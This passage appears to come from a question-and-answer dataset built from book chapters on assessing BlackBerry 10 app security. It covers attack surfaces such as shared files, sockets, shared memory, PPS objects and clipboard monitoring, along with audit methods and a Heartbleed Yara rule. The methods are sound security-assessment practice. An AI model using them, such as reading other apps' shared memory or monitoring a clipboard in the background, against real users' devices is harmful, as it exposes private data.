detail\n(http://developer.blackberry.com/native/documentation/core/com.qnx.doc\n.neutrino.sys_arch/topic/ipc.html). Reviewing the utilities that ship with BlackBerry 10 is also a good idea\nbecause a number of them come in handy when you’re investigating apps. You can find a detailed reference on\nthe BlackBerry developer website\n(http://developer.blackberry.com/native/reference/core/com.qnx.doc.neutrino.utilities/topic/about.html\nReviewing the numerous sample apps for which BlackBerry published the source code is also worthwhile\n(http://blackberry.github.io/Catalogs/All_Samples.html) because they provide a few examples with\nfunctionality one might consider dubious from a security perspective.\nFiles\nIn BlackBerry 10 under the application’s working directory (homePath()) are the following read/write locations:\n./data—This is a private data directory for the app that no other app can access. You obtain access to the\ncontents of this directory by backing up the device and decrypting the backup.\n./shared and subdirectories—These are shared files that are accessible to apps with the access_shared\ncapability.\n./tmp—As the name implies, this is a temporary directory that the app and OS may clean up. This is private\nto the app itself.\n./sharedwith—This is data that is used by the app to share files with other apps via the Invocation\nFramework.\nWith regard to /sharedwith BlackBerry has this to say about the Invocation Framework and file transfer:\nWhen the framework receives an invocation request with a file:// URI, it inspects the URI to determine if\nthe request refers to a shared area. If the file is already shared, the invocation request passes the URI to the\nfile in the shared area, as specified by the sender. However, if the invocation framework detects that the file is\nnot shared, then it creates a read/write copy of the file in a private inbox for the target app.\nhttp://developer.blackberry.com/native/documentation/\ncascades/device_platform/invocation/data_transfer.html/\nThree vectors for attacking apps via files satisfy our requirement of traversing trust boundaries. Attacking apps\nvia shared and Sharedwith is trivial. Using the app’s private data directory to attack an app has only been\npartially implemented publicly due to the inability to re-encrypt in the commercial tools.\nFor shared files you should review the files both created and consumed by the target app. However, remember\nthis attack assumes that the malicious app would have the access_shared capability. When reviewing files that\nare created, you are primarily concerned with those that contain sensitive information and shared locations\nbecause this information is useful to a malicious app on the device or to the app’s author.\nWhen assessing the files that are consumed by the target app, you are instead concerned with their contents and\nhow malformed or otherwise malicious files might influence the program. For example, you might be able to\ninject content or script in the case of a WebWorks or a Cascades application, or trigger a denial-of-service or\nmemory corruption vulnerability in an app that is written in C/C++. For sharedwith files, the attack surface is\nsimilar to when an app consumes files from the shared directory. However, instead of relying on passive\nconsumption you can invoke an app. (See the “Invocation Framework” section later in this chapter.)\nNumerous file browsers are available within BlackBerry World\n(http://appworld.blackberry.com/webstore/content/43871/?lang=en&countrycode=GB). They provide the\nability to review what files are in the shared directory, as shown Figure 15.2. Alternatively, you can use SSH\n(Secure Shell) access to review the files and their contents.\nFigure 15.2 An example file browser application\nFor files that are held in an app’s private directory, you can recover anything sensitive stored by an attack. For\ndetails on how to do this see the section, “Accessing App Data from a Device” in Chapter 14. Files with contents\nthat would modify the app’s behavior (whether execution or configuration) are modifiable. However, the ability\nto re-encrypt the backups so they can be restored to the device has not publicly been released.\nNetwork Sockets\nOn BlackBerry 10 it is conceivable that an app might implement a server of some kind via the socket API\n(http://developer.blackberry.com/native/documentation/core/com.qnx.doc.neutrino.sys_arch/topic/tcpip_sock\n.html). Indeed, BlackBerry provides example code that does this to get around some security restrictions in\nWebWorks apps.\nThis BlackBerry 10 WebWorks extension provides additional APIs supplying an embedded Web Server.\nThe API gives you the ability to serve files outside the protected application directory.\nThe reason for writing this API is that you can’t download media from an external server and display it within\na WebWorks application. This API overcomes this limitation allowing access of the Apps data or tmp\ndirectories using a URI like http://localhost:8080/.\nhttps://github.com/blackberry/WebWorks- Community-APIs/tree/master/BB10/mongoose\nIdentifying sockets that may be of interest is as simple as doing a netstat before and after the application is\ninvoked to see the new attack surface. You connect to the relevant socket via the socket API already discussed.\nIn the case of the WebWorks example, which embedded the Mongoose web server, you can actually use the web\nbrowser to demonstrate the vulnerability.\nUNIX Domain Sockets\nUNIX domain sockets are supported on BlackBerry 10 (http://developer\n.blackberry.com/native/reference/core/com.qnx.doc.neutrino.lib_ref/topic/u/unix_proto.html) and are\narguably more secure than network sockets to IPC (Inter-Process Communication) developers. With regards to\nsecurity:\nNormal filesystem access-control mechanisms are also applied when referencing pathnames (e.g., the\ndestination of a connect() or sendto() must be writable).\nhttp://developer.blackberry.com/native/reference/core/\ncom.qnx.doc.neutrino.lib_ref/topic/u/unix_proto.html\nTo list the UNIX domain sockets on the device you can use netstat -f AF_LOCAL. To attack an app that is using\nUNIX domain sockets you must create it in a location that the attacking app has read/write access to. As with\nnetwork sockets, you connect the relevant socket via the socket API as previously discussed.\nShared Memory Objects\nShared memory objects are supported on BlackBerry 10. You can find a Cascades example\n(http://blackberry.github.io/Qt2Cascades-Samples/docs/ sharedmemory.html) that shows how to use them\nin an arguably insecure fashion. This app is split over two BAR files:\nSharedMemory App—https://github.com/blackberry/Qt2Cascades-Samples/tree/master/sharedmemory\nShared Memory Loader—https://github.com/blackberry/Qt2Cascades-\nSamples/tree/master/sharedmemory_loader\nIn this example you set the key as follows:\n// The key that is used for the shared memory segment\nstatic const char *s_sharedKey = \"fileloader_shm_key\";\nThis allows the client to access the server by using this name. The underlying API is shm_open:\nThe permission bits for the memory object are set to the value of mode, except those bits set in the process’s\nfile creation mask.\nhttp://developer.blackberry.com/native/reference/core/\ncom.qnx.doc.neutrino.lib_ref/topic/s/shm_open.html\nUsing the shared memory sample app previously referenced provides a good basis upon which to build an app to\nread out the shared memory of other processes.\nIdentifying those apps that use shared memory primarily occurs via static analysis of either the code or binary.\nThat is, you look for programs that import the shm_open API or have a QSharedMemory\n(http://developer.blackberry .com/native/reference/cascades/qsharedmemory.html) object. In the case of\nCascades, applications will allow you to identify such apps. It will then be a case of finding the name (if it is\nindeed named) to attempt to connect to it.\nPPS Objects\nPersistent Publish/Subscribe (PPS) objects on BlackBerry are stored under the /pps path and can be created by\napps either via the Cascades class PpsObject\n(http://developer.blackberry.com/native/reference/cascades/bb__ppsobject .html) or via a standard\nPOSIX file API such as open; for example, open (\"/pps/an-object\", O_RDWR | O_CREAT);.\nEnumerating an app’s attack surface is as simple as enumerating the /pps namespace before and after\ninstallation and execution of the app, or if persistent PPS objects are used by backing up the app, you’ll also get a\ncopy of the PPS objects.\nNote that PPS objects are encoded. The example provided here is borrowed from\nhttp://www.qnx.com/developers/docs/660/index.jsp?topic=%2Fcom\n.qnx.doc.pps.developer%2Ftopic%2Fpps_encode.html:\npps_encoder_t encoder;\npps_encoder_initialize(&encoder, false);\npps_encoder_start_object(&encoder, \"@gps\");\npps_encoder_add_double(&encoder, \"speed\", speed);\npps_encoder_add_string(&encoder, \"city\", city);\npps_encoder_start_object(&encoder, \"position\");\npps_encoder_add_double(&encoder, \"longitude\", lon);\npps_encoder_add_double(&encoder, \"latitude\", lat);\npps_encoder_end_object(&encoder);\npps_encoder_end_object(&encoder);\nif ( pps_encoder_buffer(&encoder) != NULL ) {\nwrite(fd, pps_encoder_buffer(&encoder), pps_encoder_length(&encoder));\n}\npps_encoder_cleanup(&encoder);\nUsing this code results in a PPS object that would look like this\n(http://www.qnx.com/developers/docs/660/index.jsp?topic=%2Fcom.qnx.doc.pps\n.developer%2Ftopic%2Fpps_encode.html):\n@gps\nspeed:n:65.412\ncity::Ottawa\nposition:json:{\"latitude\":45.6512,\"longitude\":-75.9041}\nThe native C functions for encoding and decoding are not documented in the BlackBerry 10 API. Instead, you\ncan reference the QNX documentation (http://www.qnx.com/developers/docs/660/index.jsp?\ntopic=%2Fcom.qnx.doc.pps .developer%2Ftopic%2Fpps_api_reference.html). For Cascade applications, the\nPpsObject exposes versions of the encode and decode functionality, which is documented at\nhttp://developer.blackberry.com/native/reference/cascades/bb__ppsobject.html.\nTo attack PPS objects, you apply three types of attack:\nSquatting—Squatting on a PPS name for an app that will be installed at a later point allows you to supply\ninformation to consumers.\nReading—Access sensitive information such as configuration data or personally identifiable information\nthat is revealed over a PPS object.\nWriting—Write PPS data that is consumed by the server. This is possible because PPS supports multiple\npublishers that publish to the same PPS object.\nRoom exists for some mischief in the context of PPS objects.\nChannels, Messages, and Events\nChannels is a slightly confusing term in BlackBerry 10. BlackBerry has repurposed a QNX core concept into a\nterm it uses specifically in the context of BlackBerry Platform Services (BPS)\n(http://developer.blackberry.com/playbook/native/reference/com.qnx.doc.bps.lib_ref/com.qnx.doc.bps.lib_ref/topic/overview.html\nSpecifically, in the context of BPS there is an API called bps_channel_create which is used to implement this\nrepurposed meaning (http://developer\n.blackberry.com/playbook/native/reference/com.qnx.doc.bps.lib_ref/com.qnx.doc.bps.lib_ref/topic/bps_channel_create.html\nHowever, within the context of QNX a lower-level concept of channels is implemented via a number of kernel\nlevel APIs:\nThe lowest level of these APIs is\nChannelCreate—To create the listening half of a channel http://developer\n.blackberry.com/native/reference/core/com.qnx.doc.neutrino .lib_ref/topic/c/channelcreate.html\nConnectAttach—To connect as a client to the listening half of a channel\nhttp://developer.blackberry.com/native/reference/core/com.qnx\n.doc.neutrino.lib_ref/topic/c/connectattach.html\nTo use ConnectAttach you need to know a Node Descriptor (ND), a process ID (PID), and a channel ID (CHID)\nto be able to attach to a server. Blackberry provides several ways for you to obtain this information (that is,\nadvertised to other apps) in its documentation\n(http://developer.blackberry.com/native/documentation/core/com.qnx.doc.neutrino.getting_started/topic/s1_msg_find77.html\nHowever, at times you may need to try to brute-force these items.\nA slightly higher-level version of the channels APIs exists for cross-process communication:\nname_attach—Use this to register a name in the namespace and create a channel\n(http://developer.blackberry.com/native/reference/core/com.qnx.doc.neutrino.lib_ref/topic/n/name_attach.html\nname_open—Use this to open a name for a server connection\n(http://developer.blackberry.com/native/reference/core/com.qnx.doc\n.neutrino.lib_ref/topic/n/name_open.html).\nYou can find a couple of examples that show how channels are used in various apps for IPC. For example, to\ncreate and connect to a channel across threads and use pulses for events, check out this site:\nhttps://github.com/blackberry/Presentations/blob/master/2012-BlackBerryJam-\nAmericas/JAM15/FaceFilter/src/main.cpp\nThe likelihood you will see the use of channels outside of events in apps and their being vulnerable in some way\nis low.\nHigher-Level Concepts\nIn addition to the specific attack surface elements discussed already in this chapter, several other higher-level\nconcepts are worth considering when attacking BlackBerry applications.\nNetwork Traffic\nAs with apps on other OSs, the analysis of network traffic for the lack of encryption or network analysis when\nprotocols, such as SSL/TLS, are used are common tasks that we perform to validate the implementation if the\nverification of certificates is performed as well. The techniques employed to attack BlackBerry apps are no\ndifferent than those used on other mobile OSs that don’t easily allow instrumentation or where proxy settings\nmay not be honored. For suggested approaches and relevant caveats, read Chapter 14’s section called “Network\nTraffic Analysis and Interception.”\nInvocation Framework\nThe Invocation Framework addresses the concept of bounded and unbounded invocation.\nFirst and foremost, there are two kinds of invocations—unbound and bound. An unbound invocation is\nperformed when an app does not specify a specific target app that should get invoked, and hence relies on the\ninvocation framework to select the best target. For example, if there are three apps that can open .DOC files,\nthe framework chooses the best one based on its own target selection logic. So, for unbound invocations, the\nframework provides automatic brokering to find the best-fit targets and also performs target selection to\nchoose the best among the best.\nhttp://devblog.blackberry.com/2012/08/blackberry-10-invocation-framework/\nYou primarily want to focus on bounded invocations because you want to target a specific application. To\nunderstand what an app’s Invocation Framework attack surface is, you need to look in its bar-descriptor.xml.\nWithin this file there will be <invoke-target> tags; for example:\n<invoke-target id=\"com.nccgroup.mahh.foo\">\n<invoke-target-name>Foo Monster</invoke-target-name>\n<icon><image>icon.png</image></icon>\n<type>foo.monster</type>\n<filter>\n<action>bb.action.OPEN</action>\n<mime-type>*</mime-type>\n<property var=\"uris\" value=\"file://\"/>\n<property var=\"exts\" value=\"monster\"/>\n</filter>\n</invoke-target>\nThis code snippet says that it handles file URIs that end in .monster for OPEN requests. When attacking\nInvocation Framework clients you will use these definitions to attack with URIs or files that are either\nmalformed to cause undesirable behavior in the target app or to cause files or URLs to be accessed that lead to a\nsecond-stage attack.\nClipboard\nTo retrieve information from the clipboard that might be sensitive you need to use the Clipboard class in the\nCascades API (http://developer.blackberry .com/native/reference/cascades/bb__system__clipboard.html).\nThe challenge is you need to explicitly specify the MIME type; that is, text/plain, text/html, or text/url.\nThese types were identified by looking at the source code from the WebKit BlackBerry Port\n(https://github.com/adobe/webkit/blob/master/Source/WebCore/platform/blackberry/ClipboardBlackBerry.cpp\nThe SDK documentation says:\nData in the clipboard is referenced by type. Multiple types of data can exist in the clipboard at the same time.\nEach type typically refers to a different encoding of the same data. For example, an application copying data\nfrom an HTML source might insert both HTML markup and plain text into the clipboard.\n. . .\nA type can be any non-empty string. For compatibility with other applications, using Internet media types\n(i.e., MIME types) is recommended. For example, text/plain, text/html, and text/rtf are three commonly\nused encodings for textual data.\nhttp://developer.blackberry.com/native/reference/cascades/bb__system__clipboard.htm\nDue to this limitation, doing a number of requests with a variety of MIME types makes sense if you are looking\nto monitor the clipboard for changes. If you are writing an app to monitor the clipboard then make sure you\nrequest the run_when_backgrounded capability; otherwise, your app won’t execute when it’s not in the\nforeground.\nSummary\nThis chapter covers a number of ways that you can attack apps, from low-level operating system interprocess\ncommunication mechanisms through to higher-level, BlackBerry-specific concepts such as the Innovation\nFramework.\nThe attack you apply will depend on the type of app, attack surface, and the app’s specific functionality. For\nexample, you may want to assess a WebWorks app for susceptibility to script injection vulnerabilities by looking\nat the sources and syncs for data retrieved and processed by app. In the WebWorks extension example where\nthe authors embedded their own webserver (https://github .com/blackberry/WebWorks-Community-\nAPIs/tree/master/BB10/mongoose), you might look at the index.html and associated JavaScript to see whether it\npulls in a file from /shared (it doesn’t) that was under your control.\nAttacking BlackBerry 10 apps is not dissimilar to attacking any other POSIX compatible–based mobile device\napps. Yes, attacking BlackBerry 10 apps has a few unique aspects due to QNX being the underlying operating\nsystem, plus the way BlackBerry 10 is architected from a security perspective and the presence of some higher-\nlevel functionality. However, on the whole, the attack methodologies you would employ for native (that is,\nC/C++) or web (HTML5/JavaScript) apps apply when you’re assessing BlackBerry 10 apps.",
    "question": "What are the common attack surface elements of BlackBerry 10 applications and how can they be exploited?",
    "summary": "This chapter explores how to attack BlackBerry 10 applications by analyzing their trust boundaries, interprocess communication mechanisms, and other security features. It covers common attack vectors such as files, network sockets, shared memory, PPS objects, and the Invocation Framework. BlackBerry 10 apps are similar to other POSIX-based apps in terms of attack methods, but their unique architecture and security features require specific techniques for analysis."
  },
  {
    "start": 91,
    "end": 93,
    "text": "CHAPTER 16\nIdentifying BlackBerry Application Issues\nThe preceding chapters discussed how to start analyzing BlackBerry 10 apps and how you might go about\nattacking them. This chapter covers specific classes of vulnerability and how you go about identifying them\nwithin the apps being assessed.\nBlackBerry apps are not radically different from apps on any other platform. Thus the classes of issue that they\nare potentially susceptible to are not radically different compared to other platforms either.\nWhen you do practical and risk-aware assessments of apps, you are primarily concerned with attacks that fall\ninto five categories:\nApp permissions—The permissions requested by the app need to be proportional and essential to the\nfunctionality the user expects. Determine whether the permissions requested are excessive in nature.\nData storage—The app should store data in such a way that information is not exposed unnecessarily, and\ndata that is accessible should not undermine the app's security.\nData transmission—Data should be transmitted by the app in a secure and integral manner proportional\nto the sensitivity of the data.\nPersonally Identifiable Information (PII) handling and privacy—Where PII data or other privacy-\ninfringing data is processed and transmitted by the app, developers should be respectful of the user's privacy\nand opt for providing informed consent.\nSecure development—Developers should write the app in a broad and secure fashion to mitigate against\nvulnerabilities that may lead to the compromise of the app itself either via local or remote means. This\ncategory primarily deals with the lower-level programming language, operating system, and packaging\nprimitives. Check that developers haven't introduced security weaknesses or omitted mitigations.\nEach of these five core categories may be comprised of many subcategories. These subcategories include things\nsuch as cryptographic operations in the case of data transmission; this subcategory will in turn have a\nsubelement that ensures that the pseudorandom number generator source used for key material generation is\ncorrect. Another example might be in relation to secure development with a subcategory of intellectual property\nprotection with a subelement of obfuscation or jailbreak detection.\nFinally, a very broad category of consideration is privacy of the user beyond just PII. For example, tracking users\nin apps that do not handle sensitive PII may still violate user privacy. The GSM Association provides some good\nguidelines on this topic in the publication from 2012 titled, “Privacy Design Guidelines for Mobile Application\nDevelopment” (http://www.gsma.com/publicpolicy/privacy-design-guidelines-for-mobile-application-\ndevelopment). Vodafone also provides some privacy guidelines in the form of an online reference\n(http://developer.vodafone.com/develop-apps/privacy/privacy-guidelines/).\nLimiting Excessive Permissions\nPermissions form an application's first line of defense because they not only inform the user what the app needs\nbut also limit the impact if an app is compromised. In Chapter 14 we discussed application capabilities, which\nare the manifestations of permissions on the BlackBerry platform. Also in Chapter 14 we discussed the app\npackages and BAR files. MANIFEST.MF is the app's manifest file, which defines the permissions or capabilities the\napps needs. You define permissions within the manifest in Entry-Point-User-Actions.\nTo audit permissions:\n1. Obtain the BAR file and/or MANIFEST.MF.\n2. Where a BAR file is obtained, extract it as a Zip file.\n3. Review MANIFEST.MF, specifically the Entry-Point-User-Actions, against the published list of capabilities\nfrom BlackBerry ( http://developer\n.blackberry.com/native/documentation/core/com.qnx.doc.native_sdk\n.devguide/topic/c_appfund_accessing_restricted_functionality.html).\nDetermining whether an app is requesting too many permissions will normally involve a discussion with the\ndevelopers unless the app is obviously overly aggressive.\nResolving Data Storage Issues\nThe common types of data storage security issues include the following:\nStoring information such as credentials or sensitive personally identifiable information in the shared data\ndirectory, which is accessible to other apps with the access_shared capability\nStoring configuration or execution-influencing files (that is, scripts) that undermine the app's security in the\nshared data directory, which is accessible to other apps with the access_shared capability\nStoring information that is highly sensitive to a service in the app's BAR file on the presumption it won't be\naccessible\nStoring information that is highly sensitive to a service in the app's sandbox on the presumption it won't be\naccessible\nThese classes of issues can potentially impact the security or privacy of the user or potentially the app and its\nsupporting services. Over the years we've seen numerous examples of apps that embed secrets the developers\ndid not expect to be discoverable, however when pointed out required a significant re-architecture of the app in\norder to resolve in a robust manner.\nAuditing Shared Files\nThe easiest way to audit for issues involving shared files is to use SSH (Secure SHell) access to the device to take\na listing of the pre- and post-installation and usage (ls -\nRLlathttp://www.qnx.org.uk/developers/docs/6.3.0SP3/neutrino/utilities/l/ls.html). An alternate method\nis to use one of the many file browsers available in the App Store. For further information on shared files and\naccessing files refer to Chapter 15 and the section titled, “Files.”\nIn addition to checking shared files, you should also check the system logger or slogger\n(http://developer.blackberry.com/native/reference/core/com.qnx.doc.neutrino.utilities/topic/s/slogger.html\nto see whether sensitive information is being logged.\nChecking BAR Files\nAuditing for sensitive information contained in BAR files is simple:\nObtain the BAR and/or MANIFEST.MF.\nWhere a BAR file is obtained extract it as a Zip.\nYou should then review each file for sensitive files, taking care to understand and investigate that any data or\nfiles are actually archives or encoded in some manner (for example, BASE64). A useful tool for identifying file\ntypes of common binary formats is the Linux file utility or any other utility that uses libmagic\n(http://sourceforge.net/projects/libmagic/).\nReviewing the Application Sandbox\nTo be able to identify files that contain sensitive information in the app's sandbox, you first need to perform a\nbackup of the device using BlackBerry Link so you can access information that is not shipped as part of the BAR\nfile. You must then decrypt this backup file using a tool such as Elcomsoft Phone Password Breaker Forensic\nEdition. The “Accessing App Data from a Device” section of Chapter 14 covers how to use this tool.\nAfter you decrypt the backup file you are left with a .bbb file that contains three .tar files. The appdata.tar\ncontains the information you are interested in. Inside appdata.tar is a subdirectory for each of the installed\napplications, including the app's private sandbox storage. You can then locate the subdirectory for the app in\nwhich you are interested and review it. As with BAR files, carefully reviewing files that are not ASCII is\nimportant because they also may contain easily decodable sensitive information.\nChecking Data Transmission\nWhen assessing an application's data transmission mechanisms you are interested in the following:\nSensitivity of the information and whether it should be encrypted.\nIntegrity requirements for the information and whether its integrity should be guaranteed.\nEncryption and/or integrity checks are required if the protocol versions or ciphers used are known to be weak.\nEncryption\nTo assess whether the transport security from the device to an online service is present, you first need to be in a\nposition to intercept traffic. How to do this is covered the section, “Network Traffic Analysis and Interception” in\nChapter 14. Analyze all traffic to and from the app for the presence of cleartext data that is weakly encoded or\nencrypted, or that uses encrypted connections that are easy to intercept. The general rules are\nAuthentication-related information should be encrypted, including credentials and session tokens for\nservices protected by such mechanisms.\nSensitive PII including unique device or user tracker identifiers should be encrypted in transit.\nAny encryption mechanism used to protect transport data should mitigate both active (man-in-the-middle)\nand passive (traffic analysis) attacks.\nThe most common way to implement transport security is to use SSL (Secure Socket Layer) or TLS (Transport\nLayer Security). Where possible, all apps should utilize TLS 1.2 or higher, which was introduced in OpenSSL\n1.0.0h and OpenSSL 1.0.1. If TLS 1.1 needs to be supported for server compatibility, it can be, however given the\ndisclosure of the Poodle vulnerability (https://www.us-cert.gov/ncas/alerts/TA14-290A). SSL 3.0 and lower\nshould not be supported.\nWith regards to TLS usage within an app, you want to understand the following:\nWhich protocol versions are supported and whether protocol downgrade or renegotiation attacks are possible\nWhich ciphers are supported\nWhether certificate validation is performed up to a trusted Certificate Authority\nWhether Certificate Authority path validation is performed to verify that it chains to an expected CA\nWhether certificate pinning is performed to pin to a specific certificate\nThis list goes from the highest level defenses and arguably what is considered mandatory (the first three)\nthrough to the lowest level and least technically sophisticated to implement (the last two).\nTo validate these mitigations, you can use tools such as mitmproxy (http://mitmproxy.org/) combined with\ntools such as Burp Proxy, Mallory, or Canape.\nIn situations where proprietary protocols are used, you typically must employ a mixture of traffic analysis and\nreverse engineering to understand the following constructs:\nKey generation and storage\nKey exchange/agreement\nCiphering and mode of operation\nData integrity and mode of operation, if required\nOne important consideration is even though data is encrypted, it may not be afforded integrity protection.\nAlthough SSL and TLS provide this capability through the use of Hash-based Message Authentication Codes\n(HMACs), other protocols may not. This can be important in, for example, a mobile payments app where an\nattacker might be able to change the amount being transferred even though he might not be able to reliably",
    "question": "What are the five core categories of vulnerabilities that should be considered when analyzing BlackBerry 10 applications and how do they relate to app permissions, data storage, data transmission, PII handling, and secure development?",
    "summary": "This chapter discusses how to identify vulnerabilities in BlackBerry 10 apps, focusing on five main categories: app permissions, data storage, data transmission, PII handling, and secure development. It covers methods for auditing each of these areas, including reviewing app manifests, checking shared files, analyzing BAR files, and examining the application sandbox. Additionally, it provides guidance on ensuring secure data transmission through encryption and proper protocol usage."
  },
  {
    "start": 94,
    "end": 96,
    "text": "control the amount.\nOne way to validate an app's susceptibility to encrypted traffic modification is to first determine that the data\nthe app is sending is encrypted, stored, and reflected back to the app. You can then bit-flip the encrypted content\nto see whether the content is accepted by the server and whether the content reflected back to the app changes.\nIf the data is obviously BASE64 or similarly encoded, decode it prior to bit-flipping. Then re-encode it before\ntransmitting it to the server. You can make these modifications programmatically to traffic sent between the app\nand server using tools such as Mallory or Canape.\nIntegrity\nAs mentioned in the previous section, integrity is important, and protocols such as TLS automatically provide\nmechanisms to provide integrity. In some situations a protocol does not need to be encrypted, but it does need\nintegrity validation. For example, developers who don't want to pay for TLS or provide a certificate for their\ndomain might employ integrity checks to allow the use of a Content Distribution Network (CDN).\nWhen you're using cleartext protocols, analyzing them is important to identify whether the data being modified\nin transit has a negative security impact on the device. You must also verify that where integrity is provided it\nhas an HMAC. Other integrity mechanisms such as CRC32, MD5, SHA1, or SHA2, while useful to validate\ncorruption, do not provide a way of reliably validating integrity.\nHandling Personally Identifiable Information and Privacy\nWhen assessing an app for PII handling, referencing the guidelines on this topic produced by the GSM\nAssociation in its publication from 2012 titled, “Privacy Design Guidelines for Mobile Application Development”\nis a good idea (http://www.gsma.com/publicpolicy/privacy-design-guidelines-for-mobile-application-\ndevelopment). Vodafone provides privacy guidelines as well (http://developer.vodafone.com/develop-\napps/privacy/privacy-guidelines/). If you are reviewing apps for certain markets, local or regional guidelines\nmay exist, such as the “Privacy On the Go” guidelines from the California Attorney General's office\n(http://oag.ca.gov/sites/all/files/agweb/pdfs/privacy/privacy_on_the_go.pdf).\nValidating how PII is handled involves analyzing three distinct aspects of the app:\nData transmitted from the app to servers\nData stored by the app in the shared files directory\nData exposed to other apps via IPC (Inter Process Communication) mechanisms other than shared files,\nsuch as PPS (Persistent Publish/Subscribe)\nUnderstanding which PII the app has access to is important. You typically deduce this information from\nreviewing the capabilities and permissions the app has. The following permissions are PII or privacy related:\nread_geolocation—Read the current GPS location of the device (deprecated).\n_sys_access_pim_unified *—Integrate with the BlackBerry Hub. With this permission, your app can create\nand manage data in the BlackBerry Hub. This capability requires special permissions from BlackBerry.\naccess_location_services—Access the current location of the device, as well as locations that the user has\nsaved.\nrecord_audio—Access the audio stream from the microphone on the device.\nread_personally_identifiable_information—Access user information on the device, such as the first name,\nlast name, and BlackBerry ID username of the user currently associated with this device.\naccess_pimdomain_notebooks—Access the content stored in notebooks on the device. This access includes\nadding entries to, and deleting entries from, the notebooks.\naccess_phone—Determine when a user is on a phone call. This access also allows an app to access the phone\nnumber assigned to the device and send Dual Tone Multi-Frequency (DTMF) tones.\nread_phonecall_details—View the status of phone calls that are in progress and the phone number of the\nremote party.\naccess_pimdomain_calllogs—View the logs of previous incoming or outgoing phone calls.\naccess_shared—Read and write files that are shared between all apps on the device. With this permission,\nyour app can access pictures, music, documents, and other files that are stored on the user's device, at a\nremote storage provider, or on a media card.\n_sys_access_smartcard_api*—Encrypt, decrypt, sign, and verify data using a smart card. This capability\nrequires special permissions from BlackBerry.\naccess_sms_mms—Access the text messages that are stored on the device. This access includes viewing,\ncreating, sending, and deleting text messages.\naccess_wifi_public—Receive Wi-Fi event notifications such as Wi-Fi scan results or changes in the Wi-Fi\nconnection state.\nHow to identify issues with regards to the first two have already been covered earlier in this chapter. For the last\n(which exposes PII- or privacy-impacting data to other apps) understanding the IPC mechanisms available to\nBlackBerry apps is important (see Chapter 15). You must analyze each mechanism to understand whether it\nexposes PII or privacy data. Examples include:\nPPS objects—Review new PPS objects created by the app under the /pps namespace to identify those\nexposing sensitive data.\nNetwork servers—Review any new listening network socks to identify any that expose sensitive data and\ndo not enforce some form of authentication. This involves reviewing the output of netstat pre- and post-app\ninstallation and then analyzing the interface.\nShared memory—Review any new shared memory instances that expose sensitive information. To review\nthese you must write code to interact with the shared memory sections.\nAlthough local exposure to other apps of sensitive information might be less severe due to the need to have a\nmalicious app on the device it should still be considered a risk. This risk stems from the fact that an installed\nmalicious app may be able to access this sensitive information via the target app even though it does not have\nthe appropriate capabilities and permissions itself. Historically, we've seen numerous examples of this on\nplatforms such as Android.\nEnsuring Secure Development\nBeyond the specific topics already discussed in this chapter there are also more generic classes of issue that are\nvaluable to identify and articulate to developers. These classes of issues have the ability either to introduce\nvulnerabilities themselves or significantly ease the exploitation of other issues present in the app.\nMissing Compiler and Linker Defenses\nFor native Cascade and WebWork apps that use Cordova plug-ins you should assess whether the necessary\ncompiler/linker defenses are in place. (See Chapter 17.) To do this you use the cross-compiler objdump that\ncomes with the IDE and checksec.sh from Trapkit (http://www.trapkit.de/tools/checksec.html).\nYou must first obtain and extract the BAR files, and then run checksec.sh across the native binaries (including\nlibraries) looking for any omissions. In addition to checking for these important in-depth features, this bash\nscript checks for RPATH and RUNPATH. I made this addition while at BlackBerry. RPATH and RUNPATH are used by the\nloader:\n. . . All -rpath arguments are concatenated and passed to the runtime linker, which uses them to locate\nshared objects at runtime. The -rpath option is also used when locating shared objects that are needed by\nshared objects explicitly included in the link; see the description of the -rpath-link option. If -rpath isn't\nused when linking an ELF executable, the contents of the following directories are searched in order:\nLD_LIBRARY_PATH\n_CS_LIBPATH.\nhttp://www.qnx.org.uk/developers/docs/6.4.0/neutrino/utilities/l/ld.html\nThis functionality is the equivalent to the DLL Search Order on Microsoft Windows\n(http://msdn.microsoft.com/en-gb/library/windows/desktop/ms682586(v=vs.85).aspx) but provides a\nmechanism for developers to override it and quite frankly do something crazy. Because of its ability to provide\n(in theory) an RPATH / RUNPATH of an untrusted location and thus undermine the security model, auditing it if\npresent is important.\nVulnerable Third-Party Libraries\nAnother key consideration for native, Cascade, and WebWork apps that use Cordova plug-ins is the version of\nany third-party native libraries that they ship with within the BAR, or worst case are statically linked into the\nmain ELF file.\nIdentifying these vulnerable third-party external or statically linked libraries involves two approaches. The first\nis the use of a utility such as strings to extract any ASCII or UNICODE version strings that might be included\nand then cross referencing these extracted strings with the author's sites and vulnerability databases to\ndetermine whether these strings are vulnerable.\nIf the preceding approach doesn't yield anything, either version strings are omitted or are otherwise\ninconclusive, then the second approach is to fall back to reverse engineering, at least initially, to compare or\ndevelop binary signatures in Yara (https://yara.readthedocs.org/) that represent the vulnerable and non-\nvulnerable function.\nI discuss how to write robust Yara rules to detect statically linked, Heartbleed-vulnerable OpenSSL in the blog\npost, “Writing robust Yara detection rules for Heartbleed”\n(https://www.nccgroup.com/en/blog/2014/06/writing-robust-yara-detection-rules-for-heartbleed/). The\nbasic concept behind the approach is to compile a non-vulnerable version and disassemble it, as shown in Figure\n16.1.\nFigure 16.1 Disassembly of vulnerable function in IDA Pro\nYou extract the byte that doesn't reference things that can change, such as registers and addresses. These are\nhighlighted in Figure 16.1.\nYou then replicate the process used for the vulnerable version of the function and get a signature string such as\nthis:\nRu`le HeartBleedARM\n{\nstrings:\n$opensslminiARM = {04 ?? ?? ?? E9 1C 4F EA 18 22 C3\n1C 07 46 80 F8 02 \\\n80 02 20 7A 70 42 46 38 70 18 46 ?? F7}\ncondition:\n$opensslminiARM\n}\nOver time, your signature set will grow, enabling you to quickly scan apps for vulnerable dynamically and\nstatically linked third-party libraries.\nNative Code Vulnerability Classes\nThe topic of discovering native code vulnerabilities classes would fill a book. When we refer to native code\nvulnerabilities classes we primarily mean memory corruption, such as buffer overflows, underflows, double\nfrees, format strings, use-after-frees, and similar items.\nThe primary method for discovering these is fuzzing. Fuzzing is the nomenclature used for automated, negative\ntest case generation and execution, and automated bucketing or triaging, about which entire books have been\nwritten. What you fuzz and how depends on the purpose of app. For example, for an image-parsing app, your\ntarget would be the image formats that it supports. You would most likely fuzz via the Invocation Framework or\nby writing a custom test harness around the app's image-processing library.\nIf you wanted to use the Invocation Framework (see Chapter 15 in the “Invocation Framework” section) you\nwould first inspect the application's manifest and look for invocation targets, the bb.action.OPEN action, and\nthen (if supported) either common image extensions or MIME types. If these are present then you would be\nable to use the Invocation Framework to supply your generated test cases to the app. BlackBerry provides a\nsample invocation client app that shows you how to use the framework to save development 